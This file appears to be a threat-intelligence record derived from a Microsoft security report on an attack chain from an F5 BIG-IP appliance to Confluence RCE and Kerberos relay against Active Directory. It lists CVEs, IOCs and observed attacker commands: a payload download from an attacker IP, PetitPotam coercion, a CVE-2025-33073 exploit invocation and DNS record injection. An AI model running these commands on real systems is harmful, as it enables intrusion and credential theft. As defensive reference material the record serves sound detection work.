@@ -1,0 +1,94 @@
+title: 'Edge Appliance to SaaS to Active Directory: Multi-Domain Attack Chain via
+  F5 BIG-IP and Confluence RCE'
+description: A threat actor compromised an end-of-life F5 BIG-IP appliance to gain
+  SSH access to an internal Linux host, then pivoted to an unpatched Atlassian Confluence
+  server via RCE, harvested credentials, and conducted Kerberos relay attacks against
+  Active Directory using CVE-2025-33073.
+attribution: ''
+malware_families:
+- HackTool:Linux/MalPack.B
+- HackTool:Linux/Kerbrute!rfn
+cves:
+- CVE-2025-33073
+- CVE-2025-53521
+- CVE-2025-20333
+- CVE-2025-20362
+- CVE-2024-2012
+- CVE-2024-9474
+ttps:
+  processes:
+  - wget
+  - curl
+  - nmap
+  - gowitness
+  - enum4linux
+  - netexec
+  - smbclient
+  - rpcclient
+  - ldapsearch
+  - kerbrute
+  - nxc
+  - responder
+  - testssl
+  - java
+  - cat
+  - python3
+  command_lines:
+  - gowitness scan nmap -f $i --write-db --write-screenshots --screenshot-path ./screenshots
+    --screenshot-fullpage --open-only --service-contains http --delay 5 --threads
+    1 --chrome-proxy socks5://127.0.0.1:9090
+  - wget http://206.189.27[.]39:8888/5
+  - curl -o /dev/shm/ag ftp://anonymous:anonymous@[REDACTED_LOCAL_IP]/5
+  - nxc smb [REDACTED_IP] -d [REDACTED_DOMAIN].com -u Jiraservices -p '********* -M
+    coerce_plus -o M=PetitPotam L="localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA"
+  - python3 CVE-2025-33073.py -u [REDACTED_DOMAIN].com\Jiraservices -p ******** --attacker-ip
+    [REDACTED_IP] --dns-ip [REDACTED_IP] --dc-fqdn [REDACTED_HOSTNAME].[REDACTED_DOMAIN].com
+    --target [REDACTED_HOST] --target-ip [REDACTED_IP]
+  - python3 dnstool.py -u [REDACTED_DOMAIN].com\Jiraservices -p ******** [REDACTED_HOST].[REDACTED_DOMAIN].com
+    -a add -r localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA -d [REDACTED_IP]
+    -dns-ip [REDACTED_IP]
+  powershell: []
+  scripts:
+  - Shell script to automate network scanning using Nmap
+  registry_keys: []
+  image_loads: []
+  network_connections:
+  - wget -> 206.189.27[.]39:8888
+  file_activity:
+  - /opt/atlassian/confluence/conf/server.xml
+  - /var/atlassian/application-data/confluence/confluence.cfg.xml
+  - /dev/shm/ag
+  - /dev/shm/
+  - /tmp/
+  persistence:
+  - Server Software Component (T1505) via Confluence server
+  - Web shell deployed for persistent access to Confluence web server (T1505)
+  - Valid domain accounts used for subsequent attacks after compromise of Confluence
+    server (T1078.002)
+  process_relations:
+  - java -> cat server.xml
+  - java -> cat confluence.cfg.xml
+  - java -> curl -o /dev/shm/
+  - java -> curl -o /tmp/
+iocs:
+  hashes:
+  - 4a927d031919fd6bd88d3c8a917214b54bca00f8ddc80ecfe4d230663dda7465
+  - b4592cea69699b2c0737d4e19cff7dca17b5baf5a238cd6da950a37e9986f216
+  - 710a9d2653c8bd3689e451778dab9daec0de4c4c75f900788ccf23ef254b122a
+  - 57b3188e24782c27fdf72493ce599537efd3187d03b80f8afe733c72d68c5517
+  - bdd5da81ac34d9faa2a5118d4ed8f492239734be02146cd24a0e34270a48a455
+  ip_addresses:
+  - 206.189.27[.]39
+  domains: []
+  urls:
+  - hxxp://206.189.27[.]39:8888/5
+  - hxxps://my.f5[.]com/manage/s/article/K000156741
+  - hxxps://thehackernews[.]com/2026/03/cisa-adds-cve-2025-53521-to-kev-after.html
+  - hxxps://www.zscaler[.]com/blogs/security-research/cisco-firewall-and-vpn-zero-day-attacks-cve-2025-20333-and-cve-2025-20362
+  - hxxps://www.darktrace[.]com/blog/darktraces-view-on-operation-lunar-peek-exploitation-of-palo-alto-firewall-devices-cve-2024-2012-and-2024-9474
+authors:
+- Microsoft Defender Security Research
+- Microsoft Threat Intelligence
+reference: https://www.microsoft.com/en-us/security/blog/2026/05/22/from-edge-appliance-to-enterprise-compromise-multi-stage-linux-intrusion-via-f5-and-confluence/
+date_of_publication: May 22, 2026
+file_creation_date: May 26, 2026
